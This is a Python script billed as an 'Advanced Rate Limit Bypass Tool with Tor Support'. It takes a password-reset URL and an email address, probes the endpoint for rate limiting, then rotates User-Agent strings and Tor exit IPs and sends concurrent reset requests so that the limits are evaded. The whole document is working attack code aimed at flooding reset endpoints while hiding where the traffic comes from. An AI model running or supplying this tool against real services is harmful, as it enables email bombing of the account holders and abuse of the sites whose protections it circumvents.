import requests
import time
import random
import argparse
import logging
import concurrent.futures
from fake_useragent import UserAgent

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize User-Agent rotation
ua = UserAgent()

# Tor proxy configuration
TOR_PROXY = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050',
}

# Function to restart Tor circuit for a fresh IP
def change_tor_ip():
    try:
        with open("/var/run/tor/control.authcookie", "rb") as f:
            auth_cookie = f.read()
        import stem.control
        with stem.control.Controller.from_port(port=9051) as controller:
            controller.authenticate(password='your_tor_password')  # Change this in torrc
            controller.signal(stem.Signal.NEWNYM)
        logging.info("Tor IP changed successfully!")
    except Exception as e:
        logging.error(f"Failed to change Tor IP: {e}")

# Enhanced Rate Limit Detection
def check_rate_limit(url, email):
    response = requests.post(url, data={'email': email})
    
    # Detect based on headers
    if 'Retry-After' in response.headers:
        return True, int(response.headers['Retry-After'])
    
    # Detect based on response time (Soft Rate Limiting)
    start_time = time.time()
    requests.post(url, data={'email': email})
    response_time = time.time() - start_time

    if response_time > 2:  # If response is artificially delayed, assume rate limit
        return True, 0

    return False, 0

# Function to send an email using Tor
def send_email(url, email, headers=None, use_tor=False):
    try:
        proxy = TOR_PROXY if use_tor else None
        response = requests.post(url, data={'email': email}, headers=headers, proxies=proxy)
        
        if response.status_code == 200:
            logging.info(f"Email sent successfully using {'Tor' if use_tor else 'Direct Connection'}")
        else:
            logging.warning(f"Failed to send email: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending email: {e}")

# Bypass Techniques
def bypass_rate_limit(url, email):
    methods = [
        lambda: send_email(url, email, headers={'User-Agent': ua.random}),
        lambda: send_email(url, email, headers={'User-Agent': ua.random}, use_tor=True),
    ]

    for method in methods:
        try:
            method()
            logging.info(f"Bypassed rate limit using method: {method.__name__}")
            return True
        except Exception as e:
            logging.error(f"Failed to bypass rate limit using method: {e}")
            continue

    return False

# Main function
def main():
    parser = argparse.ArgumentParser(description='Advanced Rate Limit Bypass Tool with Tor Support')
    parser.add_argument('--target', required=True, help='Target URL for password reset')
    args = parser.parse_args()

    email = input("Enter the registered email: ")

    has_rate_limit, delay = check_rate_limit(args.target, email)
    
    if has_rate_limit:
        logging.info("Rate limit found. Attempting to bypass using Tor...")
        change_tor_ip()  # Switch to a new Tor IP
        bypass_rate_limit(args.target, email)
    else:
        logging.info("No rate limit found. Sending emails normally...")

        # Send multiple emails concurrently via Tor
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(send_email, args.target, email, use_tor=True) for _ in range(5)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Error in sending email: {e}")

if __name__ == "__main__":
    main()
